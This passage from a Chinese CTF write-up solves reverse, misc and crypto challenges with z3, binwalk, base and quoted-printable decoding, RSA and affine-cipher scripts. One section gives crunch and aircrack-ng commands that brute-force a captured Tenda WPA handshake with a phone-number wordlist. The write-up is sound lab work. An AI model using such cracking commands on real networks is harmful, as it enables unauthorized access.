class="hljs-number">195</span>, <span class="hljs-number">207</span>, <span class="hljs-number">110</span>, <span class="hljs-number">159</span>, <span class="hljs-number">251</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">195</span>, <span class="hljs-number">255</span>]byte_4021A0 = [<span class="hljs-number">99</span>, <span class="hljs-number">124</span>, <span class="hljs-number">119</span>, <span class="hljs-number">123</span>, <span class="hljs-number">242</span>, <span class="hljs-number">107</span>, <span class="hljs-number">111</span>, <span class="hljs-number">197</span>, <span class="hljs-number">48</span>, <span class="hljs-number">1</span>, <span class="hljs-number">103</span>, <span class="hljs-number">43</span>, <span class="hljs-number">254</span>, <span class="hljs-number">215</span>, <span class="hljs-number">171</span>, <span class="hljs-number">118</span>, <span class="hljs-number">202</span>, <span class="hljs-number">130</span>, <span class="hljs-number">201</span>, <span class="hljs-number">125</span>, <span class="hljs-number">250</span>, <span class="hljs-number">89</span>, <span class="hljs-number">71</span>, <span class="hljs-number">240</span>, <span class="hljs-number">173</span>, <span class="hljs-number">212</span>, <span class="hljs-number">162</span>, <span class="hljs-number">175</span>, <span class="hljs-number">156</span>, <span class="hljs-number">164</span>, <span class="hljs-number">114</span>, <span class="hljs-number">192</span>, <span class="hljs-number">183</span>, <span class="hljs-number">253</span>, <span class="hljs-number">147</span>, <span class="hljs-number">38</span>, <span class="hljs-number">54</span>, <span class="hljs-number">63</span>, <span class="hljs-number">247</span>, <span class="hljs-number">204</span>, <span class="hljs-number">52</span>, <span class="hljs-number">165</span>, <span class="hljs-number">229</span>, <span class="hljs-number">241</span>, <span class="hljs-number">113</span>, <span class="hljs-number">216</span>, <span class="hljs-number">49</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">199</span>, <span class="hljs-number">35</span>, <span class="hljs-number">195</span>, <span class="hljs-number">24</span>, <span class="hljs-number">150</span>, <span class="hljs-number">5</span>, <span class="hljs-number">154</span>, <span class="hljs-number">7</span>, <span class="hljs-number">18</span>, <span class="hljs-number">128</span>, <span class="hljs-number">226</span>, <span class="hljs-number">235</span>, <span class="hljs-number">39</span>, <span class="hljs-number">178</span>, <span class="hljs-number">117</span>, <span class="hljs-number">9</span>, <span class="hljs-number">131</span>, <span class="hljs-number">44</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">110</span>, <span class="hljs-number">90</span>, <span class="hljs-number">160</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">214</span>, <span class="hljs-number">179</span>, <span class="hljs-number">41</span>, <span class="hljs-number">227</span>, <span class="hljs-number">47</span>, <span class="hljs-number">132</span>, <span class="hljs-number">83</span>, <span class="hljs-number">209</span>, <span class="hljs-number">0</span>, <span class="hljs-number">237</span>, <span class="hljs-number">32</span>, <span class="hljs-number">252</span>, <span class="hljs-number">177</span>, <span class="hljs-number">91</span>, <span class="hljs-number">106</span>, <span class="hljs-number">203</span>, <span class="hljs-number">190</span>, <span class="hljs-number">57</span>, <span class="hljs-number">74</span>, <span class="hljs-number">76</span>, <span class="hljs-number">88</span>, <span class="hljs-number">207</span>, <span class="hljs-number">208</span>, <span class="hljs-number">239</span>, <span class="hljs-number">170</span>, <span class="hljs-number">251</span>, <span class="hljs-number">67</span>, <span class="hljs-number">77</span>, <span class="hljs-number">51</span>, <span class="hljs-number">133</span>, <span class="hljs-number">69</span>, <span class="hljs-number">249</span>, <span class="hljs-number">2</span>, <span class="hljs-number">127</span>, <span class="hljs-number">80</span>, <span class="hljs-number">60</span>, <span class="hljs-number">159</span>, <span class="hljs-number">168</span>, <span class="hljs-number">81</span>, <span class="hljs-number">163</span>, <span class="hljs-number">64</span>, <span class="hljs-number">143</span>, <span class="hljs-number">146</span>, <span class="hljs-number">157</span>, <span class="hljs-number">56</span>, <span class="hljs-number">245</span>, <span class="hljs-number">188</span>, <span class="hljs-number">182</span>, <span class="hljs-number">218</span>, <span class="hljs-number">33</span>, <span class="hljs-number">16</span>, <span class="hljs-number">255</span>, <span class="hljs-number">243</span>, <span class="hljs-number">210</span>, <span class="hljs-number">205</span>, <span class="hljs-number">12</span>, <span class="hljs-number">19</span>, <span class="hljs-number">236</span>, <span class="hljs-number">95</span>, <span class="hljs-number">151</span>, <span class="hljs-number">68</span>, <span class="hljs-number">23</span>, <span class="hljs-number">196</span>, <span class="hljs-number">167</span>, <span class="hljs-number">126</span>, <span class="hljs-number">61</span>, <span class="hljs-number">100</span>, <span class="hljs-number">93</span>, <span class="hljs-number">25</span>, <span class="hljs-number">115</span>, <span class="hljs-number">96</span>, <span class="hljs-number">129</span>, <span class="hljs-number">79</span>, <span class="hljs-number">220</span>, <span class="hljs-number">34</span>, <span class="hljs-number">42</span>, <span class="hljs-number">144</span>, <span class="hljs-number">136</span>, <span class="hljs-number">70</span>, <span class="hljs-number">238</span>, <span class="hljs-number">184</span>, <span class="hljs-number">20</span>, <span class="hljs-number">222</span>, <span class="hljs-number">94</span>, <span class="hljs-number">11</span>, <span class="hljs-number">219</span>, <span class="hljs-number">224</span>, <span class="hljs-number">50</span>, <span class="hljs-number">58</span>, <span class="hljs-number">10</span>, <span class="hljs-number">73</span>, <span class="hljs-number">6</span>, <span class="hljs-number">36</span>, <span class="hljs-number">92</span>, <span class="hljs-number">194</span>, <span class="hljs-number">211</span>, <span class="hljs-number">172</span>, <span class="hljs-number">98</span>, <span class="hljs-number">145</span>, <span class="hljs-number">149</span>, <span class="hljs-number">228</span>, <span class="hljs-number">121</span>, <span class="hljs-number">231</span>, <span class="hljs-number">200</span>, <span class="hljs-number">55</span>, <span class="hljs-number">109</span>, <span class="hljs-number">141</span>, <span class="hljs-number">213</span>, <span class="hljs-number">78</span>, <span class="hljs-number">169</span>, <span class="hljs-number">108</span>, <span class="hljs-number">86</span>, <span class="hljs-number">244</span>, <span class="hljs-number">234</span>, <span class="hljs-number">101</span>, <span class="hljs-number">122</span>, <span class="hljs-number">174</span>, <span class="hljs-number">8</span>, <span class="hljs-number">186</span>, <span class="hljs-number">120</span>, <span class="hljs-number">37</span>, <span class="hljs-number">46</span>, <span class="hljs-number">28</span>, <span class="hljs-number">166</span>, <span class="hljs-number">180</span>, <span class="hljs-number">198</span>, <span class="hljs-number">232</span>, <span class="hljs-number">221</span>, <span class="hljs-number">116</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">189</span>, <span class="hljs-number">139</span>, <span class="hljs-number">138</span>, <span class="hljs-number">112</span>, <span class="hljs-number">62</span>, <span class="hljs-number">181</span>, <span class="hljs-number">102</span>, <span class="hljs-number">72</span>, <span class="hljs-number">3</span>, <span class="hljs-number">246</span>, <span class="hljs-number">14</span>, <span class="hljs-number">97</span>, <span class="hljs-number">53</span>, <span class="hljs-number">87</span>, <span class="hljs-number">185</span>, <span class="hljs-number">134</span>, <span class="hljs-number">193</span>, <span class="hljs-number">29</span>, <span class="hljs-number">158</span>, <span class="hljs-number">225</span>, <span class="hljs-number">248</span>, <span class="hljs-number">152</span>, <span class="hljs-number">17</span>, <span class="hljs-number">105</span>, <span class="hljs-number">217</span>, <span class="hljs-number">142</span>, <span class="hljs-number">148</span>, <span class="hljs-number">155</span>, <span class="hljs-number">30</span>, <span class="hljs-number">135</span>, <span class="hljs-number">233</span>, <span class="hljs-number">206</span>, <span class="hljs-number">85</span>, <span class="hljs-number">40</span>, <span class="hljs-number">223</span>, <span class="hljs-number">140</span>, <span class="hljs-number">161</span>, <span class="hljs-number">137</span>, <span class="hljs-number">13</span>, <span class="hljs-number">191</span>, <span class="hljs-number">230</span>, <span class="hljs-number">66</span>, <span class="hljs-number">104</span>, <span class="hljs-number">65</span>, <span class="hljs-number">153</span>, <span class="hljs-number">45</span>, <span class="hljs-number">15</span>, <span class="hljs-number">176</span>, <span class="hljs-number">84</span>, <span class="hljs-number">187</span>]<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">z3_solve</span><span class="hljs-params">(res_flag,byte_4021A0,flag1)</span>:</span>solve_flag = Solver()flag2 = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag2.append(BitVec(<span class="hljs-string">'v'</span>+str(i),<span class="hljs-number">8</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):solve_flag.add(( (<span class="hljs-number">16</span> * ((flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>))+(<span class="hljs-number">16</span> * flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>)== flag1[i])check_flag = solve_flag.check()<span class="hljs-keyword">print</span> check_flag,type(check_flag)res_model = solve_flag.model()flag_final = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag_chr =(<span class="hljs-string">"%s"</span>%(res_model[flag2[i]]))flag_final  = flag_final + chr(int(flag_chr))<span class="hljs-keyword">print</span> flag_final<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">res_find</span><span class="hljs-params">(list_flag,byte_4021A0)</span>:</span>list_find = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list_flag:res = byte_4021A0.index(i)list_find.append(res)<span class="hljs-keyword">return</span> list_find<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:res = res_find(list_flag,byte_4021A0)<span class="hljs-comment"># for i in res:</span><span class="hljs-comment"># print i</span>z3_solve(list_flag,byte_4021A0,res)<span class="hljs-keyword">print</span> <span class="hljs-string">"Finish\n"</span></code></pre><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="真的不是图片">真的不是图片<a class="post-anchor" href="#真的不是图片"></a></h2><p>题目给了一张图片，binwalk一下</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>题目中有zip，和正常压缩包图片对比一下<br>emmm<br>反正是少了个zip头了</p><p><a href="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" alt></a><br>可以发现 50 4B 03 04 被替换成了ja66</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed137859        0x21A83         Zip archive data, at least v2.0 to extract, compressed size: 2605, uncompressed size: 11258, name: subject.zip140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>然后foremost分离<br>ja66解压缩</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):f = open(<span class="hljs-string">'./'</span>+str(i)+<span class="hljs-string">'/'</span>+str(i)+<span class="hljs-string">'.txt'</span>,<span class="hljs-string">'r'</span>)flag += f.read()<span class="hljs-keyword">print</span> base64.b64decode(flag)<span class="hljs-comment">#jactf&#123;64se64_1s_50_c001&#125;</span></code></pre><h2 id="what">what<a class="post-anchor" href="#what"></a></h2><h3 id="题目描述">题目描述<a class="post-anchor" href="#题目描述"></a></h3><p><code>=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6</code></p><h3 id="解题过程">解题过程<a class="post-anchor" href="#解题过程"></a></h3><p>Quoted-Printable也是MIME邮件中常用的编码方式之一。同Base64一样，它也将输入的字符串或数据编码成全是ASCII码的可打印字符串。<br><a href="python%E6%A8%A1%E5%9D%97%E4%B9%8Bquopri:%20quoted-printable%E7%BC%96%E8%A7%A3%E7%A0%81">quopri</a><br><code>quopri.decodestring()</code>解码可得</p><p>佛曰：梵僧奢楞奢吉若奢不帝冥夜是缽朋缽真特俱上罰能皤室阿諳明一切呐除梵姪缽婆呐亦參侄呼皤世哆特哆故勝諳爍謹智皤參孕逝諳謹漫死即侄除哆逝侄是奢喝礙豆諳楞無俱者哆度者。諳真冥訶侄勝竟藝奢不伊皤謹涅孕無他羅大得闍哆喝耶僧無羯滅除利缽多梵夷梵栗缽者孕諳盧皤三罰寫老梵耶室帝梵寫羯數梵盡侄栗侄藐俱世諳上諳姪數室婆罰槃奢訶哆多逝藐道梵楞梵南侄迦呐知朋楞侄離呐沙呐智遮大室神冥輸殿缽槃梵怛恐舍知皤迦奢般諳爍寫漫伊俱栗哆他亦缽楞怛冥呼切俱菩舍呐實栗奢波摩諳道缽瑟哆實皤爍勝薩罰諸奢般諦罰明缽諦尼哆楞佛俱醯諳滅度哆所槃姪麼所恐諳他侄寫瑟侄所得隸哆闍呐提盧冥咒奢曰呐沙怯般南怯地缽喝冥想呐盧罰謹呼跋缽上娑諦死侄迦</p><p>参悟佛所言的真意<br>公正友善自由公正民主公正和谐法治自由公正公正法治友善平等公正爱国公正平等法治爱国公正敬业公正友善爱国平等诚信平等法治敬业法治平等公正公正公正诚信平等平等友善敬业法治民主法治富强法治友善法治<br>社会主义核心价值观解码得flag<br><code>jactf{hexin_yufo_qp}</code></p><h2 id="小梳子">小梳子<a class="post-anchor" href="#小梳子"></a></h2><p>生成字典爆破</p><pre><code class="hljs bash">crunch 11 11 -t 138364%%%%% -o/root/桌面/test.txtaircrack-ng -w /root/桌面/test.txt Tenda_D07D90-01.cap</code></pre><h1 id="Crypto">Crypto<a class="post-anchor" href="#Crypto"></a></h1><h2 id="贝斯家族三英战群魔">贝斯家族三英战群魔<a class="post-anchor" href="#贝斯家族三英战群魔"></a></h2><p>直接上脚本</p><pre><code class="hljs python">$ python base.py ciphertext_ea88a4d420c804686a8899608e06130f.txt<span class="hljs-number">1</span>using base16 decode sucess.....<span class="hljs-number">2</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">3</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">4</span>using base16 decode sucess.....<span class="hljs-number">5</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">6</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">7</span>using base16 decode sucess.....<span class="hljs-number">8</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">9</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">10</span>using base16 decode sucess.....<span class="hljs-number">11</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">12</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">13</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode failuer.....jactf&#123;<span class="hljs-number">4</span>(b64_32_16)&#125;</code></pre><h2 id="罗马帝国的奠基者">罗马帝国的奠基者<a class="post-anchor" href="#罗马帝国的奠基者"></a></h2><p>根据凯撒加密方式和flag格式可得</p><pre><code class="hljs python">a = <span class="hljs-string">'h^_o`[pZi^i`'</span>b = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">90</span>):  b= <span class="hljs-string">""</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):    b += chr(ord(a[i])+i+<span class="hljs-number">2</span>)  <span class="hljs-keyword">print</span> b</code></pre><h2 id="绝密情报">绝密情报<a class="post-anchor" href="#绝密情报"></a></h2><h3 id="题目描述-1">题目描述<a class="post-anchor" href="#题目描述-1"></a></h3><blockquote><p>WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd<br>而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？</p></blockquote><h3 id="解题过程-1">解题过程<a class="post-anchor" href="#解题过程-1"></a></h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,libnumenc = <span class="hljs-string">"WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd"</span>enc = base64.b64decode(enc)enc_list = eval(enc)flag = <span class="hljs-string">""</span><span class="hljs-keyword">print</span> enc_listd = <span class="hljs-number">3960784897</span>n = <span class="hljs-number">5520780427</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(enc_list)):m = pow(enc_list[i],d,n)flag += chr(m)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5</span></code></pre><p>des 解密下即可<br>jactf{So_easy_RSA_and_DES}</p><h2 id="贝叶斯">贝叶斯<a class="post-anchor" href="#贝叶斯"></a></h2><h3 id="题目">题目<a class="post-anchor" href="#题目"></a></h3><p>一共给了两个文件<br>encode.txt</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-keyword">int</span> len = C.length();<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; len; k ++) &#123;<span class="hljs-keyword">int</span> where = des_find(P, C[k]);where = ((where * a) + b) mod x;<span class="hljs-built_in">cout</span> &lt;&lt; P[where];&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>&#123;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i++) &#123;<span class="hljs-keyword">if</span> (m == p[i]) &#123;<span class="hljs-keyword">return</span>  i;&#125;&#125;&#125;</code></pre><p>题目.txt</p><blockquote><p>现已知某间谍使用的密码本（这可是贝叶斯设计的密码本）如下：”elFXRVJUWVVJT1B4Y3Zibm1hc2RmQVNERkdISktMZ2hqa2xfcXdaWENWQk5NZXJ0e3l1aW9wfTAxMjM0OTg3NjU=”<br>现获取到了他们的加密算法，同时劫获了一段数据密文：”gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7”<br>你能破译出明文数据吗？</p></blockquote><h3 id="解题过程-2">解题过程<a class="post-anchor" href="#解题过程-2"></a></h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PSIZE 65   <span class="hljs-comment">//宏定义密码表大小</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert&#123;yuiop&#125;0123498765"</span>)</span></span>;               <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">M</span><span class="hljs-params">(<span 